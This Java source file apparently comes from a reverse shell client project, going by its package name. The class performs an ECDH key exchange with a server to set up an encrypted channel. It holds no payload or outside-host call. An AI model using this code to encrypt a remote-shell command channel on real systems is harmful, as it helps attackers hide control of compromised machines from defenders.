package obs1d1anc1ph3r.reverseshell.client.encryption;

import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;
import java.io.IOException;

public class KeyExchangeHandler {

	private final StreamHandler streamHandler;
	private final byte[] privateKey;
	private final byte[] publicKey;

	public KeyExchangeHandler(StreamHandler streamHandler) {
		this.streamHandler = streamHandler;
		// Generate the private and public key on creation
		this.privateKey = ECDHKeyExchange.generatePrivateKey();
		this.publicKey = ECDHKeyExchange.generatePublicKey(privateKey);
	}

	// Send the public key to the server
	public void sendPublicKey() throws IOException {
		streamHandler.sendPublicKey(publicKey);
	}

	// Receive the server's public key and perform the key exchange
	public byte[] performKeyExchange() throws IOException {
		// Receive the server's public key
		byte[] serverPublicKey = streamHandler.receivePublicKey();
		if (serverPublicKey == null || serverPublicKey.length == 0) {
			throw new IOException("Invalid or empty public key received.");
		}

		// Perform the ECDH key exchange
		return ECDHKeyExchange.performECDHKeyExchange(privateKey, serverPublicKey);
	}

}
